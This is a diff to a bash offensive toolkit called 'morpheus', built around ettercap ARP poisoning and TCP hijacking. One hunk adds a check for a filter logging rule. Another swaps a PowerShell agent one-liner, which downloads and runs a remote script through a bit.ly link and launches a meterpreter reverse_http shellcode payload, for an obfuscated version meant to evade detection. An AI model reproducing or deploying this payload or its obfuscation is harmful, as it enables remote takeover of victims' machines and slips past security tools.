@@ -2130,6 +2130,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
   sleep 1
 
+
     # compiling template.eft to be used in ettercap
     echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
@@ -2148,7 +2149,15 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
       #
       warnme=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute warn.sh script?\n\nWARNING: your filter must contain\nthe follow rule to trigger BEEP sounds:\nlog(DATA.data, \"./beep-warning.beep\");" --width 290) > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
-        xterm -T "MORPHEUS - warn.sh" -geometry 108x24 -e "cd $IPATH/bin && ./warn.sh" &
+        # check if: log(DATA.data, "./beep-warning.beep"); API exists in template ..
+        cfg=`cat $IPATH/filters/template.eft | grep "log(DATA.data, \"./beep-warning.beep\");"`
+        if [ "$?" -eq "0" ]; then
+          xterm -T "MORPHEUS - warn.sh" -geometry 108x24 -e "cd $IPATH/bin && ./warn.sh" &
+        else
+          echo ${RedF}[x]${white} Filter rule:${YellowF}" log(DATA.data, \"./beep-warning.beep\");"${Reset};
+          echo ${RedF}[x] Not found inside Filter, aborting warn.sh execution ..${Reset};
+          sleep 4
+        fi
       fi
 
       cd $IPATH/logs
@@ -2822,7 +2831,12 @@ elif [ "$form" = "Build VBScript agent" ]; then
 else
   echo ${BlueF}[☠]${white} Building http agent.ps1 ..${Reset};
   sleep 2
-oneliner="powershell.exe -exec bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost $lhost –Lport $lport –Force"
+
+# TODO: check if obfuscated agent connects back ..
+oneliner="PoWeRsHelL /W\`in 1 /n\`oP /Com\`mand \"0i=(\"{reve'+'rse_ht'+'tp}{wind'+'ows/}{met'+'erpr'+'eter/}\" -f'1','2','0');I\`EX ('({0}w-Obj\`ect {0}t.WebC\`lient).{1}Str\`ing(\"{2}bit'+'.ly/14b'+'ZZ'+'0c\")' -f'Ne','Down'+'load','htt'+'p://');In\`voke-Sh\`ell\`cod\`e –P\`ay\`loa\`d \$0i –Lh\`ost $lhost –Lp\`ort $lport –F\`or\`ce\""
+
+# default ..
+# oneliner="powershell.exe -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost $lhost –Lport $lport –Force\""
 fi
 
 
